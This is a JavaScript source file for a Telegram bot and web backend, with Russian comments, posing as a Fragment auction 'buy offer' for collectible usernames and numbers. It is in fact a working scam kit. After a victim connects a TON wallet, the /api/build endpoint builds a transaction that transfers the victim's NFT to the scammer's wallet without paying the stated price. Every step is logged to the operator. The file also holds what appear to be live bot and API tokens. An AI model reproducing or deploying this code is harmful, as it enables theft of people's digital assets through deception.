// index.js

// ==========================================
// НАСТРОЙКИ (ВСТАВЬ СВОИ ДАННЫЕ СЮДА)
// ==========================================
const CONFIG = {
    BOT_TOKEN: "9136335540:AAEN-2dE4xNA8iCrm_y_JnXu_mEC6LiRz44", // Токен от @BotFather
    BOT_URL: "https://fake-offers.vercel.app", // Твой домен (где лежит Mini App)
    LOG_CHAT_ID: "-100123456789", // ID чата или канала для логов
    TONAPI_KEY: "AH2Y7R2UT5TLXVIAAAAEPTYXMSXA4RWJMGIFGJWWU4SKYF4ETSTGPGSNBDB5HYMOGYSLYMQ" // Твой ключ с tonconsole.com
};
// ==========================================

const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const cors = require('cors');
const { Address } = require('@ton/core');
const crypto = require('crypto');

const app = express();
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

const bot = new Telegraf(CONFIG.BOT_TOKEN);

// Временное хранилище офферов
const offers = new Map(); 
const userStates = new Map();

async function sendLog(text) {
    if (!CONFIG.LOG_CHAT_ID) return;
    try {
        await bot.telegram.sendMessage(CONFIG.LOG_CHAT_ID, text, { parse_mode: 'HTML' });
    } catch (e) { console.error("Log error:", e.message); }
}

// --- КОМАНДА /START ---
bot.start((ctx) => {
    ctx.replyWithHTML(
        `👋 Привет, <b>${ctx.from.first_name}</b>!\n\n` +
        `Я бот для создания офферов на покупку юзернеймов и анонимных номеров на Fragment.\n\n` +
        `Напиши /hwork, чтобы создать оффер.`
    );
});

// --- КОМАНДА /hwork ---
bot.command('hwork', (ctx) => {
    userStates.set(ctx.from.id, { step: 'target' });
    ctx.reply("Шаг 1 из 3: Введите юзернейм (без @) или номер (+888...), который хотите купить:");
});

bot.on('text', async (ctx) => {
    const state = userStates.get(ctx.from.id);
    if (!state) return;
    const text = ctx.message.text.trim();

    if (state.step === 'target') {
        state.target = text;
        state.isNumber = text.startsWith('+');
        state.step = 'price';
        userStates.set(ctx.from.id, state);
        return ctx.reply(`Цель: ${state.target}. Теперь введите цену в TON:`);
    }

    if (state.step === 'price') {
        const price = parseFloat(text);
        if (isNaN(price) || price <= 0) return ctx.reply("Ошибка: введите число.");
        state.price = price;
        state.step = 'address';
        userStates.set(ctx.from.id, state);
        return ctx.reply(`Цена: ${price} TON. Введите ваш TON-кошелек (UQ...), куда перейдет актив:`);
    }

    if (state.step === 'address') {
        try {
            Address.parse(text); 
            const offerId = crypto.randomBytes(4).toString('hex');
            
            offers.set(offerId, {
                id: offerId,
                target: state.target,
                isNumber: state.isNumber,
                price: state.price,
                buyerAddress: text,
                creatorId: ctx.from.id,
                creatorName: ctx.from.username || ctx.from.first_name,
                status: 'active'
            });

            userStates.delete(ctx.from.id);
            
            const offerUrl = `${CONFIG.BOT_URL}/?offer_id=${offerId}`;
            
            const rawNumber = state.target.replace('+', '').replace(/\s/g, '');
            const imgUrl = state.isNumber 
                ? `https://nft.fragment.com/number/${rawNumber}.webp` 
                : `https://nft.fragment.com/username/${state.target}.webp`;

            const title = state.isNumber ? state.target : `@${state.target}`;
            
            const textMessage = `
🔥 <b>Fragment Auctions</b>
<b>Buy ${title}</b>
Check the current availability of ${title}, a collectible ${state.isNumber ? 'number' : 'username'} for Telegram.

Пользователь <a href="tg://user?id=${ctx.from.id}">@${ctx.from.username || ctx.from.first_name}</a> предлагает <b>${state.price} TON</b> за этот актив.
`;
            
            try {
                // Пытаемся отправить с картинкой
                const msg = await ctx.replyWithPhoto(imgUrl, {
                    caption: textMessage,
                    parse_mode: 'HTML',
                    ...Markup.inlineKeyboard([
                        [Markup.button.webApp("Принять оффер", offerUrl)],
                        [Markup.button.callback("Отклонить", `reject_${offerId}`)]
                    ])
                });
                offers.get(offerId).msgId = msg.message_id;
            } catch (imgError) {
                // Если картинка не загрузилась, отправляем просто текст
                const msg = await ctx.replyWithHTML(textMessage, {
                    ...Markup.inlineKeyboard([
                        [Markup.button.webApp("Принять оффер", offerUrl)],
                        [Markup.button.callback("Отклонить", `reject_${offerId}`)]
                    ])
                });
                offers.get(offerId).msgId = msg.message_id;
            }
            
            offers.get(offerId).chatId = ctx.chat.id;

        } catch (e) {
            return ctx.reply("Ошибка: неверный формат кошелька.");
        }
    }
});

// --- ИНЛАЙН РЕЖИМ ---
bot.on('inline_query', async (ctx) => {
    const query = ctx.inlineQuery.query.trim();
    const results = [];

    for (const [id, offer] of offers.entries()) {
        if (offer.status !== 'active') continue;
        if (query && !offer.target.toLowerCase().includes(query.toLowerCase())) continue;

        const title = offer.isNumber ? offer.target : `@${offer.target}`;
        const offerUrl = `${CONFIG.BOT_URL}/?offer_id=${offer.id}`;
        const rawNumber = offer.target.replace('+', '').replace(/\s/g, '');
        
        const imgUrl = offer.isNumber 
            ? `https://nft.fragment.com/number/${rawNumber}.webp` 
            : `https://nft.fragment.com/username/${offer.target}.webp`;

        results.push({
            type: 'article',
            id: offer.id,
            title: `Оффер: ${title}`,
            description: `Цена: ${offer.price} TON`,
            thumb_url: imgUrl,
            input_message_content: {
                message_text: `🔥 <b>Fragment Auctions</b>\n<b>Buy ${title}</b>\nCheck the current availability of ${title}, a collectible ${offer.isNumber ? 'number' : 'username'} for Telegram.\n\nПользователь предлагает <b>${offer.price} TON</b> за этот актив.`,
                parse_mode: 'HTML'
            },
            reply_markup: {
                inline_keyboard: [
                    [{ text: "Открыть оффер", url: offerUrl }]
                ]
            }
        });
    }

    await ctx.answerInlineQuery(results, { cache_time: 0 });
});

// --- ОТКЛОНЕНИЕ ОФФЕРА ---
bot.action(/^reject_(.+)$/, async (ctx) => {
    const offerId = ctx.match[1];
    const offer = offers.get(offerId);

    if (!offer) return ctx.answerCbQuery("Оффер не найден");
    if (ctx.from.id !== offer.creatorId) return ctx.answerCbQuery("Вы не создатель этого оффера!");

    offer.status = 'rejected';
    offers.set(offerId, offer);

    try {
        const caption = ctx.callbackQuery.message.caption || "Оффер отклонен";
        await ctx.editMessageCaption(
            `${caption}\n\n❌ <b>Оффер отклонен владельцем</b>`,
            {
                parse_mode: 'HTML',
                reply_markup: { inline_keyboard: [] }
            }
        );
    } catch (e) {
        console.error("Не удалось изменить сообщение", e);
    }

    ctx.answerCbQuery("Оффер отклонен");
});

// --- API ДЛЯ MINI APP ---
app.get('/api/offer/:id', (req, res) => {
    const offer = offers.get(req.params.id);
    if (!offer) return res.status(404).json({ error: "Оффер не найден" });
    if (offer.status === 'rejected') return res.status(400).json({ error: "Оффер был отклонен" });
    
    sendLog(`👀 <b>Открыли страницу</b>\nЦель: ${offer.target}\nЦена: ${offer.price} TON`);
    
    res.json({ 
        target: offer.target, 
        isNumber: offer.isNumber, 
        price: offer.price 
    });
});

app.post('/api/build', async (req, res) => {
    const { address, offer_id } = req.body;
    const offer = offers.get(offer_id);

    if (!offer) return res.status(404).json({ error: "Оффер не найден" });
    if (offer.status === 'rejected') return res.status(400).json({ error: "Оффер отклонен" });
    if (!address) return res.status(400).json({ error: "Кошелек не подключен" });

    sendLog(`👛 <b>Подключили кошелек</b>\nАдрес: <code>${address}</code>`);

    try {
        const r = await fetch(`https://tonapi.io/v2/accounts/${address}/nfts?limit=100`, {
            headers: { Authorization: `Bearer ${CONFIG.TONAPI_KEY}` }
        });
        const data = await r.json();
        
        const nft = data.nft_items?.find(n => 
            n.metadata?.name?.toLowerCase().includes(offer.target.toLowerCase().replace('+', ''))
        );

        if (!nft) {
            sendLog(`🔎 <b>Актив не найден на кошельке</b>`);
            return res.status(404).json({ error: "Этот актив не найден на данном кошельке" });
        }

        sendLog(`✅ <b>Актив найден, открыт Tonkeeper</b>`);

        const { beginCell } = require('@ton/ton');
        const newOwner = Address.parse(offer.buyerAddress);

        const payload = beginCell()
            .storeUint(0x5fcc3d14, 32)
            .storeUint(0, 64)
            .storeAddress(newOwner)
            .storeAddress(newOwner)
            .storeBit(0)
            .storeCoins(0)
            .storeBit(0)
            .endCell()
            .toBoc()
            .toString("base64");

        res.json({
            validUntil: Math.floor(Date.now() / 1000) + 300,
            messages: [{
                address: nft.address,
                amount: "50000000", 
                payload: payload
            }]
        });

    } catch (e) {
        sendLog(`⚠️ <b>Ошибка:</b> ${e.message}`);
        res.status(500).json({ error: "Ошибка сервера" });
    }
});

app.post('/api/signed', (req, res) => {
    const { offer_id } = req.body;
    const offer = offers.get(offer_id);
    if (offer) {
        sendLog(`🎉 <b>Актив переведён!</b>\nЦель: ${offer.target}\nЦена: ${offer.price} TON`);
        offer.status = 'completed';
        offers.delete(offer_id);
    }
    res.json({ ok: true });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
bot.launch();
console.log("Bot started");
